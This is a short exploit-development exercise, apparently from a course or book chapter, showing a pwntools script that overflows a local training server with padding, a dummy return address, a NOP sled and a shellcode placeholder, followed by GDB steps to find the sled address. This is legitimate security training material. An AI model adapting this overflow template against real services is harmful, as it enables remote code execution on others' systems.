1. Run this program to crash the program in GDB and find nop positions using gdb:
```python
#!/usr/bin/env python3
#ch10_6_exploit.py
from pwn import *
context(bits=32, arch='i386')
# Connect to vulnerable ch10_6 server
p = remote('localhost', 5555)
shellcode = b"<SHELLCODE>"
nopsled_address = b"BBBB"
# Craft our payload
payload = b"A"*264
payload += nopsled_address
payload += b"\x90"*32
payload += shellcode
p.sendlineafter(b"Username: ", payload) # Send payload
p.interactive()
```
2. This will crash the program at EIP 42424242. We just need to determine the position of the nop sled aftewards.
3. Run: `x/64x $esp` in GDB to get the address of the nop sled
